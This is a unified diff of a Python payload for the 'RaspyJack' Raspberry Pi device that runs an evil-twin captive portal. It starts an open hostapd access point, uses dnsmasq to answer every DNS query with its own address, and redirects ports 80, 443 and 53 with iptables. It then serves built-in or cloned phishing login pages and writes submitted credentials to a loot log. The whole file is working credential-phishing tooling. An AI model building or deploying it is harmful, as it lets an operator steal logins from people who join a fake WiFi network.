@@ -1,36 +1,27 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- Advanced Captive Portal
-==============================================
+RaspyJack Payload -- Captive Portal
+====================================
 Author: 7h30th3r0n3
 
-Captive portal with template selection. Serves phishing pages
-from /root/Raspyjack/DNSSpoof/sites/ or built-in templates.
+Full captive portal with menu-driven management: start/stop/restart the AP,
+select portal page from DNSSpoof/sites/ or built-in templates, edit SSID,
+manage MAC whitelist, view captured credentials.
 
 Setup / Prerequisites
 ---------------------
-- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
+- USB WiFi dongle with AP mode support (e.g. Alfa AWUS036ACH)
 - apt install hostapd dnsmasq-base
 - Optional: phishing templates in /root/Raspyjack/DNSSpoof/sites/
-- Dongle is auto-detected on wlan1+ (onboard wlan0 is reserved for WebUI)
-
-Flow:
-  1) Show template list (DNSSpoof/sites/ + built-in)
-  2) User selects template
-  3) Start hostapd on USB dongle (open network)
-  4) Start dnsmasq for DHCP + DNS wildcard redirect
-  5) Serve selected template via HTTP server
-  6) Capture POST credentials
+- Dongle is auto-detected via select_interface (onboard wlan0 reserved)
 
 Controls:
-  OK          -- Select template / start
-  UP / DOWN   -- Scroll templates
-  LEFT / RIGHT-- Change SSID character
-  KEY1        -- Show captured credentials
-  KEY2        -- Export to loot
-  KEY3        -- Exit + cleanup
-
-Loot: /root/Raspyjack/loot/CaptivePortal/
+  UP/DOWN  -- Navigate menu / scroll
+  LEFT     -- Delete char (SSID editor)
+  RIGHT    -- Add char (SSID editor)
+  OK       -- Select action / confirm
+  KEY1     -- Quick toggle portal on/off
+  KEY3     -- Back / Exit
 """
 
 import os
@@ -53,6 +44,7 @@ import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 from payloads._display_helper import ScaledDraw, scaled_font
 from payloads._input_helper import get_button
+from payloads._keyboard_helper import lcd_keyboard
 from payloads._iface_helper import select_interface
 
 PINS = {
@@ -69,71 +61,40 @@ WIDTH, HEIGHT = LCD.width, LCD.height
 font = scaled_font()
 
 # ---------------------------------------------------------------------------
-# Constants
+# Paths & constants
 # ---------------------------------------------------------------------------
-LOOT_DIR = "/root/Raspyjack/loot/CaptivePortal"
+PORTAL_DIR = "/root/Raspyjack/DNSSpoof/sites"
+LOOT_DIR = "/root/Raspyjack/loot/Portal"
+CONFIG_PATH = os.path.join(LOOT_DIR, "portal_config.json")
+WHITELIST_PATH = os.path.join(LOOT_DIR, "whitelist.json")
+CREDS_LOG = os.path.join(LOOT_DIR, "creds.log")
+HOSTAPD_CONF = "/tmp/rj_portal_hostapd.conf"
+DNSMASQ_CONF = "/tmp/rj_portal_dnsmasq.conf"
+GATEWAY_IP = "10.0.77.1"
+DHCP_RANGE = "10.0.77.10,10.0.77.250,12h"
+HTTP_PORT = 80
+ROW_H = 12
+ROWS_VISIBLE = 7
 os.makedirs(LOOT_DIR, exist_ok=True)
 
-SITES_DIR = "/root/Raspyjack/DNSSpoof/sites"
-HOSTAPD_CONF = "/tmp/raspyjack_captive_hostapd.conf"
-DNSMASQ_CONF = "/tmp/raspyjack_captive_dnsmasq.conf"
-PORTAL_PORT = 80
-GATEWAY_IP = "10.0.99.1"
-DHCP_RANGE_START = "10.0.99.10"
-DHCP_RANGE_END = "10.0.99.250"
-ROWS_VISIBLE = 6
+VIEW_MENU = "menu"
+VIEW_STATUS = "status"
+VIEW_SELECT = "select_portal"
+VIEW_WHITELIST = "whitelist"
+VIEW_CREDS = "creds"
+VIEW_SSID = "edit_ssid"
+
+MENU_ITEMS = [
+    "Status", "Start Portal", "Stop Portal",
+    "Restart Portal", "Select Portal", "Set SSID",
+    "Whitelist", "View Creds",
+]
 
 SSID_CHARS = list(
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-    "0123456789 -_."
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 -_."
 )
 
-# ---------------------------------------------------------------------------
-# WiFi helpers
-# ---------------------------------------------------------------------------
-
-def _is_onboard_wifi_iface(iface):
-    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
-    try:
-        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
-        if "mmc" in devpath:
-            return True
-    except Exception:
-        pass
-    try:
-        driver = os.path.basename(
-            os.path.realpath(f"/sys/class/net/{iface}/device/driver"),
-        )
-        if driver == "brcmfmac":
-            return True
-    except Exception:
-        pass
-    return False
-
-
-def _find_usb_wifi():
-    """Find first USB WiFi interface (skip onboard)."""
-    try:
-        for name in sorted(os.listdir("/sys/class/net")):
-            if not name.startswith("wlan"):
-                continue
-            if _is_onboard_wifi_iface(name):
-                continue
-            return name
-    except Exception:
-        pass
-    return None
-
-
-def _set_managed_mode(iface):
-    """Restore managed mode."""
-    for cmd in (
-        ["sudo", "ip", "link", "set", iface, "down"],
-        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
-        ["sudo", "ip", "link", "set", iface, "up"],
-    ):
-        subprocess.run(cmd, capture_output=True, timeout=5)
-
+_PORTAL_FILES = ("index.html", "login.html", "index.php")
 
 # ---------------------------------------------------------------------------
 # Built-in templates
@@ -162,34 +123,6 @@ border-radius:6px;cursor:pointer;font-size:16px;margin-top:10px}
 <button type="submit">Connect</button>
 </form></div></body></html>"""
 
-BUILTIN_HOTEL_WIFI = """<!DOCTYPE html>
-<html><head><title>Hotel WiFi</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-body{font-family:Georgia,serif;background:#f5f0e8;color:#333;
-display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-.box{background:#fff;padding:35px;border-radius:4px;
-box-shadow:0 2px 15px rgba(0,0,0,.1);max-width:400px;width:90%;
-border-top:4px solid #8b7355}
-h2{margin-top:0;color:#8b7355;font-weight:normal}
-input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;
-border-radius:4px;box-sizing:border-box}
-button{width:100%;padding:14px;background:#8b7355;color:#fff;border:none;
-border-radius:4px;cursor:pointer;font-size:16px;margin-top:10px}
-.note{color:#999;font-size:11px;margin-top:15px}
-</style></head><body>
-<div class="box">
-<h2>Welcome Guest</h2>
-<p>Enter your room number and last name to connect.</p>
-<form method="POST" action="/login">
-<input name="room" placeholder="Room Number" required>
-<input name="lastname" placeholder="Last Name" required>
-<input name="email" placeholder="Email (optional)">
-<button type="submit">Access WiFi</button>
-</form>
-<p class="note">Complimentary WiFi for registered guests.</p>
-</div></body></html>"""
-
 BUILTIN_SUCCESS = """<!DOCTYPE html>
 <html><head><title>Connected</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -199,79 +132,131 @@ h2{color:#4ecca3}.check{font-size:64px;color:#4ecca3}</style></head>
 <body><div class="check">&#10003;</div>
 <h2>Connected!</h2><p>You are now online.</p></body></html>"""
 
-BUILTIN_TEMPLATES = {
-    "WiFi Login": BUILTIN_WIFI_LOGIN,
-    "Hotel WiFi": BUILTIN_HOTEL_WIFI,
-}
-
 # ---------------------------------------------------------------------------
 # Shared state
 # ---------------------------------------------------------------------------
 lock = threading.Lock()
-templates = []          # list of {"name": ..., "path": ... or None, "builtin": bool}
+view = VIEW_MENU
+menu_idx = 0
 scroll_pos = 0
-selected_idx = 0
-status_msg = "Select template"
-view_mode = "templates"  # templates | ssid_edit | attack | creds
-attack_running = False
-_portal_running = False
+status_msg = "Idle"
+portal_running = False
 running = True
 credentials = []
 clients_connected = 0
-ssid = list("FreeWiFi")
-ssid_cursor = 0
-active_template_name = ""
 
+# SSID editor state
+ssid_chars = []
+ssid_char_idx = 0
+
+# Process handles
 _hostapd_proc = None
 _dnsmasq_proc = None
 _portal_server = None
 _iface = None
 
 # ---------------------------------------------------------------------------
-# Template discovery
+# JSON file helpers
 # ---------------------------------------------------------------------------
 
-def _discover_templates():
-    """Scan for available templates."""
-    found = []
+def _load_json(path, default):
+    try:
+        with open(path, "r") as f:
+            return json.load(f)
+    except Exception:
+        return default
 
-    # Built-in templates
-    for name in BUILTIN_TEMPLATES:
-        found.append({"name": name, "path": None, "builtin": True})
 
-    # DNSSpoof sites
-    if os.path.isdir(SITES_DIR):
-        try:
-            for entry in sorted(os.listdir(SITES_DIR)):
-                site_path = os.path.join(SITES_DIR, entry)
-                if os.path.isdir(site_path):
-                    # Check for index.html or login.html
-                    for fname in ("index.html", "login.html", "index.php"):
-                        if os.path.isfile(os.path.join(site_path, fname)):
-                            found.append({
-                                "name": entry,
-                                "path": site_path,
-                                "builtin": False,
-                            })
-                            break
-        except Exception:
-            pass
+def _save_json(path, data):
+    try:
+        with open(path, "w") as f:
+            json.dump(data, f, indent=2)
+    except Exception:
+        pass
 
-    return found
+
+def _load_config():
+    return _load_json(CONFIG_PATH, {"selected_portal": "", "ssid": "FreeWiFi"})
+
+
+def _save_config(cfg):
+    _save_json(CONFIG_PATH, cfg)
+
+
+def _load_whitelist():
+    return _load_json(WHITELIST_PATH, [])
+
+
+def _save_whitelist(wl):
+    _save_json(WHITELIST_PATH, wl)
 
 
 # ---------------------------------------------------------------------------
-# Portal HTTP server
+# Portal discovery
+# ---------------------------------------------------------------------------
+
+def _discover_portals():
+    """Scan PORTAL_DIR for subdirectories containing a portal page."""
+    portals = []
+    if not os.path.isdir(PORTAL_DIR):
+        return portals
+    try:
+        for entry in sorted(os.listdir(PORTAL_DIR)):
+            entry_path = os.path.join(PORTAL_DIR, entry)
+            if not os.path.isdir(entry_path):
+                continue
+            for pf in _PORTAL_FILES:
+                if os.path.isfile(os.path.join(entry_path, pf)):
+                    portals.append(entry)
+                    break
+    except Exception:
+        pass
+    return portals
+
+
+def _find_portal_page(portal_name):
+    """Return the main HTML file path for a portal."""
+    portal_path = os.path.join(PORTAL_DIR, portal_name)
+    for pf in _PORTAL_FILES:
+        fp = os.path.join(portal_path, pf)
+        if os.path.isfile(fp):
+            return fp
+    return None
+
+
+def _count_clients():
+    """Count connected clients via hostapd_cli."""
+    try:
+        result = subprocess.run(
+            ["sudo", "hostapd_cli", "all_sta"],
+            capture_output=True, text=True, timeout=5,
+        )
+        macs = re.findall(r"[0-9a-f:]{17}", result.stdout, re.I)
+        return len(set(macs))
+    except Exception:
+        return 0
+
+
+def _count_creds():
+    """Count credential lines in the log file."""
+    try:
+        with open(CREDS_LOG, "r") as f:
+            return sum(1 for ln in f if ln.strip())
+    except Exception:
+        return 0
+
+
+# ---------------------------------------------------------------------------
+# HTTP credential-capture server
 # ---------------------------------------------------------------------------
 
 class CaptiveHandler(BaseHTTPRequestHandler):
-    """Serve captive portal pages and capture credentials."""
+    """Serve captive portal pages and capture POST credentials."""
 
     template_html = BUILTIN_WIFI_LOGIN
     template_dir = None
 
     def _serve_file(self, filepath, content_type="text/html"):
-        """Serve a file from the template directory."""
         try:
             with open(filepath, "rb") as fh:
                 data = fh.read()
@@ -284,7 +269,6 @@ class CaptiveHandler(BaseHTTPRequestHandler):
             self.send_error(404)
 
     def _guess_content_type(self, path):
-        """Guess content type from file extension."""
         ext = os.path.splitext(path)[1].lower()
         types = {
             ".html": "text/html", ".htm": "text/html",
@@ -292,6 +276,7 @@ class CaptiveHandler(BaseHTTPRequestHandler):
             ".png": "image/png", ".jpg": "image/jpeg",
             ".jpeg": "image/jpeg", ".gif": "image/gif",
             ".svg": "image/svg+xml", ".ico": "image/x-icon",
+            ".php": "text/html",
         }
         return types.get(ext, "application/octet-stream")
 
@@ -299,9 +284,8 @@ class CaptiveHandler(BaseHTTPRequestHandler):
         path = self.path.split("?")[0]
 
         if self.template_dir:
-            # Serve from template directory
-            if path == "/" or path == "":
-                for fname in ("index.html", "login.html", "index.php"):
+            if path in ("/", ""):
+                for fname in _PORTAL_FILES:
                     fpath = os.path.join(self.template_dir, fname)
                     if os.path.isfile(fpath):
                         self._serve_file(fpath)
@@ -314,9 +298,11 @@ class CaptiveHandler(BaseHTTPRequestHandler):
                     ct = self._guess_content_type(fpath)
                     self._serve_file(fpath, ct)
                 else:
-                    self.send_error(404)
+                    # Fallback: redirect unknown paths to /
+                    self.send_response(302)
+                    self.send_header("Location", "/")
+                    self.end_headers()
         else:
-            # Serve built-in template
             html = self.template_html.encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "text/html")
@@ -325,13 +311,11 @@ class CaptiveHandler(BaseHTTPRequestHandler):
             self.wfile.write(html)
 
     def do_POST(self):
-        global clients_connected
         content_len = int(self.headers.get("Content-Length", 0))
         body = ""
         if content_len > 0:
             body = self.rfile.read(content_len).decode("utf-8", errors="replace")
 
-        # Parse form data
         params = parse_qs(body)
         cred_entry = {
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -345,6 +329,8 @@ class CaptiveHandler(BaseHTTPRequestHandler):
         if cred_entry["fields"]:
             with lock:
                 credentials.append(cred_entry)
+            # Also append to creds.log for persistent storage
+            _append_creds_log(cred_entry)
 
         # Serve success page
         html = BUILTIN_SUCCESS.encode("utf-8")
@@ -362,106 +348,166 @@ class ThreadedPortalServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
 
 
+def _append_creds_log(entry):
+    """Append a credential entry to the persistent log file."""
+    try:
+        fields = entry.get("fields", {})
+        line = (
+            f"[{entry['timestamp']}] {entry['src_ip']} "
+            f"{' '.join(f'{k}={v}' for k, v in fields.items())}"
+        )
+        with open(CREDS_LOG, "a") as f:
+            f.write(line + "\n")
+    except Exception:
+        pass
+
+
 # ---------------------------------------------------------------------------
-# hostapd + dnsmasq
+# Network helpers
 # ---------------------------------------------------------------------------
 
-def _write_hostapd_conf(iface, ssid_str):
-    """Write hostapd config for open AP."""
-    conf = (
-        f"interface={iface}\n"
-        f"driver=nl80211\n"
-        f"ssid={ssid_str}\n"
-        f"hw_mode=g\n"
-        f"channel=6\n"
-        f"wmm_enabled=0\n"
-        f"auth_algs=1\n"
-        f"wpa=0\n"
-        f"ignore_broadcast_ssid=0\n"
-    )
-    with open(HOSTAPD_CONF, "w") as fh:
-        fh.write(conf)
+def _run(cmd):
+    subprocess.run(cmd, capture_output=True, timeout=5)
+
+
+def _set_managed_mode(iface):
+    """Restore managed mode on interface."""
+    for cmd in (
+        ["sudo", "ip", "link", "set", iface, "down"],
+        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
+        ["sudo", "ip", "link", "set", iface, "up"],
+    ):
+        _run(cmd)
+
+
+def _write_hostapd_conf(iface, ssid_str, channel=6):
+    with open(HOSTAPD_CONF, "w") as f:
+        f.write(
+            f"interface={iface}\ndriver=nl80211\nssid={ssid_str}\n"
+            f"hw_mode=g\nchannel={channel}\nwmm_enabled=0\n"
+            f"auth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+        )
 
 
 def _write_dnsmasq_conf(iface):
-    """Write dnsmasq config with DNS wildcard redirect."""
-    conf = (
-        f"interface={iface}\n"
-        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},1h\n"
-        f"dhcp-option=3,{GATEWAY_IP}\n"
-        f"dhcp-option=6,{GATEWAY_IP}\n"
-        f"address=/#/{GATEWAY_IP}\n"
-        f"no-resolv\n"
-    )
-    with open(DNSMASQ_CONF, "w") as fh:
-        fh.write(conf)
+    with open(DNSMASQ_CONF, "w") as f:
+        f.write(
+            f"interface={iface}\ndhcp-range={DHCP_RANGE}\n"
+            f"dhcp-option=3,{GATEWAY_IP}\ndhcp-option=6,{GATEWAY_IP}\n"
+            f"address=/#/{GATEWAY_IP}\nno-resolv\nlog-queries\nlog-dhcp\n"
+        )
+
+
+def _iptables_whitelist_add(iface, mac):
+    _run(["sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
+          "-i", iface, "-m", "mac", "--mac-source", mac, "-j", "ACCEPT"])
+
+
+def _setup_iptables(iface):
+    """Redirect HTTP (80), HTTPS (443), and DNS (53) to the portal."""
+    for dport, proto in [("80", "tcp"), ("443", "tcp"), ("53", "udp")]:
+        if proto == "udp":
+            dest = f"{GATEWAY_IP}:53"
+        else:
+            dest = f"{GATEWAY_IP}:{HTTP_PORT}"
+        _run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
+              "-i", iface, "-p", proto, "--dport", dport,
+              "-j", "DNAT", "--to-destination", dest])
+    # MASQUERADE for captive portal detection on modern devices
+    _run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
+          "-j", "MASQUERADE"])
+    # Enable IP forwarding
+    _run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
+    # Apply whitelist entries
+    for mac in _load_whitelist():
+        _iptables_whitelist_add(iface, mac)
+
+
+def _teardown_iptables():
+    _run(["sudo", "iptables", "-t", "nat", "-F"])
+    _run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
 
 
 # ---------------------------------------------------------------------------
 # Client counter thread
 # ---------------------------------------------------------------------------
 
-def _count_clients():
-    """Periodically count connected clients via hostapd."""
+def _client_counter_loop():
+    """Periodically update connected client count."""
     global clients_connected
-    while running and attack_running:
-        try:
-            result = subprocess.run(
-                ["sudo", "hostapd_cli", "all_sta"],
-                capture_output=True, text=True, timeout=5,
-            )
-            # Count MAC addresses in output
-            macs = re.findall(r"[0-9a-f:]{17}", result.stdout, re.I)
-            with lock:
-                clients_connected = len(set(macs))
-        except Exception:
-            pass
+    while running and portal_running:
+        count = _count_clients()
+        with lock:
+            clients_connected = count
         time.sleep(5)
 
 
 # ---------------------------------------------------------------------------
-# Attack start / stop
+# Service lifecycle
 # ---------------------------------------------------------------------------
 
-def _start_attack(template):
-    """Start captive portal with selected template."""
-    global attack_running, _portal_running, status_msg, _hostapd_proc
-    global _dnsmasq_proc, _portal_server, active_template_name
+def _start_portal():
+    global portal_running, status_msg
+    global _hostapd_proc, _dnsmasq_proc, _portal_server
 
     iface = _iface
     if not iface:
         with lock:
-            status_msg = "No USB WiFi"
+            status_msg = "No WiFi interface"
         return
 
-    ssid_str = "".join(ssid)
+    cfg = _load_config()
+    portal_name = cfg.get("selected_portal", "")
+    ssid_str = cfg.get("ssid", "FreeWiFi")
+    use_builtin = not portal_name
+    portal_path = None
+
+    if portal_name:
+        portal_path = os.path.join(PORTAL_DIR, portal_name)
+        if not os.path.isdir(portal_path):
+            with lock:
+                status_msg = "Portal dir missing"
+            return
+
+        # Auto-create redirect if no index.html
+        idx_path = os.path.join(portal_path, "index.html")
+        if not os.path.isfile(idx_path):
+            target = None
+            for candidate in ("login.html", "index.php"):
+                if os.path.isfile(os.path.join(portal_path, candidate)):
+                    target = candidate
+                    break
+            if not target:
+                html_files = [
+                    f for f in os.listdir(portal_path) if f.endswith(".html")
+                ]
+                if html_files:
+                    target = html_files[0]
+            if target:
+                with open(idx_path, "w") as fh:
+                    fh.write(
+                        f'<meta http-equiv="refresh" content="0;url=/{target}">'
+                    )
+
     with lock:
-        status_msg = f"Starting {ssid_str}..."
-        active_template_name = template["name"]
+        status_msg = "Configuring..."
 
+    # Prepare interface
     _set_managed_mode(iface)
-    time.sleep(0.5)
+    time.sleep(0.3)
+    _run(["sudo", "ip", "addr", "flush", "dev", iface])
+    _run(["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface])
+    _run(["sudo", "ip", "link", "set", iface, "up"])
 
-    # Configure IP
-    subprocess.run(
-        ["sudo", "ip", "addr", "flush", "dev", iface],
-        capture_output=True,
-    )
-    subprocess.run(
-        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
-        capture_output=True,
-    )
-    subprocess.run(
-        ["sudo", "ip", "link", "set", iface, "up"],
-        capture_output=True,
-    )
-
-    # Write configs
-    _write_hostapd_conf(iface, ssid_str)
-    _write_dnsmasq_conf(iface)
+    # Kill stale processes
+    for proc_name in ("hostapd", "dnsmasq"):
+        _run(["sudo", "killall", proc_name])
+    time.sleep(0.3)
 
     # Start hostapd
-    subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
+    _write_hostapd_conf(iface, ssid_str)
+    with lock:
+        status_msg = "Starting hostapd..."
     try:
         _hostapd_proc = subprocess.Popen(
             ["sudo", "hostapd", HOSTAPD_CONF],
@@ -469,13 +515,18 @@ def _start_attack(template):
         )
     except Exception as exc:
         with lock:
-            status_msg = f"hostapd failed: {exc}"
+            status_msg = f"hostapd err: {exc}"
+        return
+    time.sleep(1.5)
+    if _hostapd_proc.poll() is not None:
+        with lock:
+            status_msg = "hostapd failed"
         return
 
-    time.sleep(1)
-
     # Start dnsmasq
-    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)
+    _write_dnsmasq_conf(iface)
+    with lock:
+        status_msg = "Starting dnsmasq..."
     try:
         _dnsmasq_proc = subprocess.Popen(
             ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
@@ -483,69 +534,68 @@ def _start_attack(template):
         )
     except Exception as exc:
         with lock:
-            status_msg = f"dnsmasq failed: {exc}"
-
-    # Configure portal handler
-    if template["builtin"]:
-        CaptiveHandler.template_html = BUILTIN_TEMPLATES[template["name"]]
-        CaptiveHandler.template_dir = None
-    else:
-        CaptiveHandler.template_dir = template["path"]
-
-    # Start portal HTTP server
-    try:
-        _portal_server = ThreadedPortalServer(
-            ("0.0.0.0", PORTAL_PORT), CaptiveHandler,
-        )
-        portal_thread = threading.Thread(
-            target=_portal_server.serve_forever, daemon=True,
-        )
-        portal_thread.start()
-    except Exception as exc:
+            status_msg = f"dnsmasq err: {exc}"
+        return
+    time.sleep(0.5)
+    if _dnsmasq_proc.poll() is not None:
         with lock:
-            status_msg = f"Portal failed: {exc}"
+            status_msg = "dnsmasq failed"
         return
 
-    # Enable IP forwarding for captive portal detection
-    subprocess.run(
-        ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
-        capture_output=True,
-    )
-    # NAT redirect HTTP to portal
-    subprocess.run(
-        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
-         "-p", "tcp", "--dport", "80", "-j", "DNAT",
-         "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
-        capture_output=True,
-    )
-    subprocess.run(
-        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
-         "-j", "MASQUERADE"],
-        capture_output=True,
-    )
+    # Configure HTTP handler
+    if use_builtin:
+        CaptiveHandler.template_html = BUILTIN_WIFI_LOGIN
+        CaptiveHandler.template_dir = None
+    else:
+        CaptiveHandler.template_dir = portal_path
+
+    # Start threaded HTTP server with credential capture
+    with lock:
+        status_msg = "Starting HTTP..."
+    try:
+        _portal_server = ThreadedPortalServer(
+            ("0.0.0.0", HTTP_PORT), CaptiveHandler,
+        )
+        threading.Thread(
+            target=_portal_server.serve_forever, daemon=True,
+        ).start()
+    except Exception as exc:
+        if _dnsmasq_proc:
+            _dnsmasq_proc.terminate()
+        if _hostapd_proc:
+            _hostapd_proc.terminate()
+        with lock:
+            status_msg = f"HTTP err: {exc}"
+        return
+
+    # Iptables redirect (80 + 443 + DNS)
+    _setup_iptables(iface)
+
+    label = portal_name if portal_name else "Built-in"
+    with lock:
+        portal_running = True
+        status_msg = f"Portal '{label}' live"
+
+    # Start client counter thread
+    threading.Thread(target=_client_counter_loop, daemon=True).start()
+
+
+def _stop_portal():
+    global portal_running, status_msg
+    global _hostapd_proc, _dnsmasq_proc, _portal_server
 
     with lock:
-        attack_running = True
-        _portal_running = True
-        status_msg = f"Portal: {ssid_str}"
-        view_mode = "attack"
+        status_msg = "Stopping..."
 
-    # Start client counter
-    threading.Thread(target=_count_clients, daemon=True).start()
-
-
-def _stop_attack():
-    """Stop all services and clean up."""
-    global attack_running, _portal_running, _hostapd_proc, _dnsmasq_proc, _portal_server
-
-    with lock:
-        attack_running = False
-        _portal_running = False
-
+    # Shut down HTTP server
     if _portal_server:
-        _portal_server.shutdown()
+        try:
+            _portal_server.shutdown()
+        except Exception:
+            pass
         _portal_server = None
 
+    # Terminate hostapd
     if _hostapd_proc and _hostapd_proc.poll() is None:
         _hostapd_proc.terminate()
         try:
@@ -554,6 +604,7 @@ def _stop_attack():
             _hostapd_proc.kill()
     _hostapd_proc = None
 
+    # Terminate dnsmasq
     if _dnsmasq_proc and _dnsmasq_proc.poll() is None:
         _dnsmasq_proc.terminate()
         try:
@@ -562,307 +613,451 @@ def _stop_attack():
             _dnsmasq_proc.kill()
     _dnsmasq_proc = None
 
-    # Kill any remaining
-    subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
-    subprocess.run(["sudo", "killall", "dnsmasq"], capture_output=True)
+    # Kill any strays
+    for proc_name in ("hostapd", "dnsmasq"):
+        _run(["sudo", "killall", proc_name])
 
-    # Cleanup iptables
-    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
-    subprocess.run(
-        ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
-        capture_output=True,
-    )
+    _teardown_iptables()
 
-    # Restore interface
-    if _iface:
-        _set_managed_mode(_iface)
-
-    # Remove temp files
+    # Clean temp files
     for path in (HOSTAPD_CONF, DNSMASQ_CONF):
         try:
             os.remove(path)
         except OSError:
             pass
 
+    # Restore interface
+    if _iface:
+        _set_managed_mode(_iface)
 
-# ---------------------------------------------------------------------------
-# Restart helper
-# ---------------------------------------------------------------------------
+    with lock:
+        portal_running = False
+        status_msg = "Portal stopped"
+
 
 def _restart_portal():
-    """Restart portal services (stop then start with same template)."""
-    global _portal_running, status_msg
-    with lock:
-        atk = attack_running
-        si = selected_idx
-        tpls = list(templates)
-    if not atk or not (0 <= si < len(tpls)):
-        return
-    tpl = tpls[si]
-    with lock:
-        _portal_running = False
-        status_msg = "Restarting..."
-    _stop_attack()
-    _start_attack(tpl)
+    _stop_portal()
+    time.sleep(0.5)
+    _start_portal()
 
 
 # ---------------------------------------------------------------------------
-# Export
+# Draw helpers  (128-base ScaledDraw coordinates)
 # ---------------------------------------------------------------------------
 
-def _export_creds():
-    """Export captured credentials to loot."""
+def _draw_header(d, title):
+    d.rectangle((0, 0, 127, 13), fill="#111")
+    d.text((2, 1), title, font=font, fill="#00CCFF")
+
+
+def _draw_footer(d, text):
+    d.rectangle((0, 116, 127, 127), fill="#111")
+    d.text((2, 117), text, font=font, fill="#888")
+
+
+def _new_frame():
+    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    return img, ScaledDraw(img)
+
+
+# ---------------------------------------------------------------------------
+# View renderers
+# ---------------------------------------------------------------------------
+
+def draw_menu():
+    img, d = _new_frame()
+    _draw_header(d, "CAPTIVE PORTAL")
     with lock:
-        data = {
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "ssid": "".join(ssid),
-            "template": active_template_name,
-            "clients": clients_connected,
-            "credentials": list(credentials),
-        }
-    if not data["credentials"]:
-        return
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    path = os.path.join(LOOT_DIR, f"captive_{ts}.json")
+        idx = menu_idx
+        is_running = portal_running
+    tag = "[ON]" if is_running else "[OFF]"
+    d.text((95, 1), tag, font=font, fill="#00FF00" if is_running else "#FF4444")
+    for i, item in enumerate(MENU_ITEMS):
+        y = 16 + i * ROW_H
+        if y > 110:
+            break
+        sel = i == idx
+        d.text((2, y), f"{'>' if sel else ' '} {item}", font=font,
+               fill="#00CCFF" if sel else "#AAAAAA")
+    _draw_footer(d, "OK:Select K1:Toggle")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+
+def draw_status():
+    img, d = _new_frame()
+    _draw_header(d, "PORTAL STATUS")
+    with lock:
+        up = portal_running
+        msg = status_msg
+        cli = clients_connected
+    cfg = _load_config()
+    name = cfg.get("selected_portal", "") or "Built-in"
+    ssid_val = cfg.get("ssid", "FreeWiFi")
+    cred_count = _count_creds()
+
+    d.text((2, 18), "Service:", font=font, fill="#888")
+    d.text((55, 18), "RUNNING" if up else "STOPPED", font=font,
+           fill="#00FF00" if up else "#FF4444")
+    d.text((2, 34), "Portal:", font=font, fill="#888")
+    d.text((46, 34), name[:14], font=font, fill="#FFFFFF")
+    d.text((2, 50), "SSID:", font=font, fill="#888")
+    d.text((36, 50), ssid_val[:16], font=font, fill="#00CCFF")
+    d.text((2, 66), "Clients:", font=font, fill="#888")
+    d.text((55, 66), str(cli), font=font, fill="#FFAA00")
+    d.text((2, 78), "Creds:", font=font, fill="#888")
+    d.text((42, 78), str(cred_count), font=font,
+           fill="#FF4444" if cred_count else "#666")
+    if up:
+        d.text((2, 90), f"IP: {GATEWAY_IP}", font=font, fill="#666")
+    d.text((2, 102), msg[:22], font=font, fill="#FFAA00")
+    _draw_footer(d, "K3:Back")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+
+def draw_select_portal():
+    img, d = _new_frame()
+    _draw_header(d, "SELECT PORTAL")
+    portals = _discover_portals()
+    current = _load_config().get("selected_portal", "")
+    with lock:
+        sc = scroll_pos
+    if not portals:
+        d.text((4, 40), "No portals found", font=font, fill="#FF4444")
+        d.text((4, 54), "Add dirs to:", font=font, fill="#666")
+        d.text((4, 66), "DNSSpoof/sites/", font=font, fill="#666")
+        d.text((4, 82), "Or leave empty for", font=font, fill="#666")
+        d.text((4, 94), "built-in template", font=font, fill="#666")
+    else:
+        for i, name in enumerate(portals[sc:sc + ROWS_VISIBLE]):
+            y = 16 + i * ROW_H
+            actual_idx = sc + i
+            active = name == current
+            sel = actual_idx == sc
+            color = "#00FF00" if active else "#00CCFF" if sel else "#AAAAAA"
+            d.text(
+                (2, y),
+                f"{'>' if sel else ' '}{'*' if active else ' '}{name[:17]}",
+                font=font, fill=color,
+            )
+    _draw_footer(d, "OK:Select K3:Back")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+
+def draw_whitelist():
+    img, d = _new_frame()
+    _draw_header(d, "WHITELIST")
+    wl = _load_whitelist()
+    with lock:
+        sc = scroll_pos
